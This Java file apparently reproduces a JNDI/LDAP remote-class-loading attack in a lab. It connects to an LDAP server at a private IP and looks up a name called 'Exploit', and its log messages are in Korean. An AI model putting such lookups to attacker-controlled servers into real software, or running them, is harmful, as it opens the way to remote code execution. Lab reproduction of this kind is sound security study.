import javax.naming.*;
import javax.naming.directory.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.util.Hashtable;

public class Final {
	    private static final Logger logger = LogManager.getLogger(Final.class);

	        public static void main(String[] args) {
			        try {
					            String ldapHost = "ldap://192.168.52.134:1389";  
						                String exploitPayload = "Exploit";  

								            Hashtable<String, String> env = new Hashtable<>();
									                env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
											            env.put(Context.PROVIDER_URL, ldapHost);
												                env.put(Context.SECURITY_AUTHENTICATION, "none");

														            LdapContext ctx = new InitialLdapContext(env, null);
															                logger.info("LDAP 서버 연결 성공: " + ldapHost);

																	            String result = (String) ctx.lookup(exploitPayload);
																		                logger.info("받은 결과: " + result);

																				            ctx.close();
																					            } catch (NamingException e) {
																							                logger.error("LDAP 연결 실패 또는 요청 처리 중 오류 발생", e);
																									        }
				    }
}

